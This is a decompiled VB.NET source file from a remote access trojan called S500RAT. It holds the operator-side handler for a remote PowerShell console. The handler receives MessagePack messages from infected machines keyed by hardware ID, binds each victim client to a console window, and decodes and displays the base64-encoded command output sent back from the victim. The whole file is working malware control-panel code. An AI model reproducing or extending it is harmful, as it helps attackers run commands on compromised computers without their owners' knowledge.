Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000057 RID: 87
	Public Class FrmPowerShell
		' Token: 0x060011A4 RID: 4516 RVA: 0x0009B968 File Offset: 0x00099B68
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formPowerShell As FormPowerShell = CType(Application.OpenForms("FrmPowerShell" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormPowerShell)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "Ready", False) <> 0 Then
						If Operators.CompareString(asString, "WritePowerShell", False) <> 0 Then
							If Operators.CompareString(asString, "Event", False) = 0 Then
								Dim flag As Boolean = formPowerShell IsNot Nothing
								If flag Then
									Try
										formPowerShell.T2.[ReadOnly] = True
										formPowerShell.T2.BackColor = Color.DarkRed
									Catch ex As Exception
									End Try
								End If
							End If
						Else
							Dim flag2 As Boolean = formPowerShell IsNot Nothing
							If flag2 Then
								Try
									Dim t As UIRichTextBox = formPowerShell.T1
									SyncLock t
										formPowerShell.T1.SelectionStart = formPowerShell.T1.TextLength
										Dim t2 As UIRichTextBox = formPowerShell.T1
										Dim text As String = unpack_msgpack.ForcePathObject("WriteCode").AsString.Replace(vbCrLf, String.Empty)
										t2.AppendText(Functions.DencryptBase64ToString(text) + vbCrLf)
										formPowerShell.T1.SelectionStart = formPowerShell.T1.TextLength
										formPowerShell.T1.ScrollToCaret()
									End SyncLock
								Catch ex2 As Exception
								End Try
							End If
						End If
					Else
						Dim flag3 As Boolean = formPowerShell IsNot Nothing
						If flag3 Then
							Try
								formPowerShell.T2.[ReadOnly] = False
								formPowerShell.T2.BackColor = Color.FromArgb(7, 11, 41)
							Catch ex3 As Exception
							End Try
						End If
					End If
				Else
					Dim flag4 As Boolean = formPowerShell IsNot Nothing
					If flag4 Then
						Dim flag5 As Boolean = formPowerShell.Client Is Nothing
						If flag5 Then
							client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
							formPowerShell.Client = client
							formPowerShell.Timer1.Enabled = True
						End If
					End If
				End If
			Catch ex4 As Exception
				ListLogs.AddArray("PowerShell " + client.IP + " Error : " + ex4.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
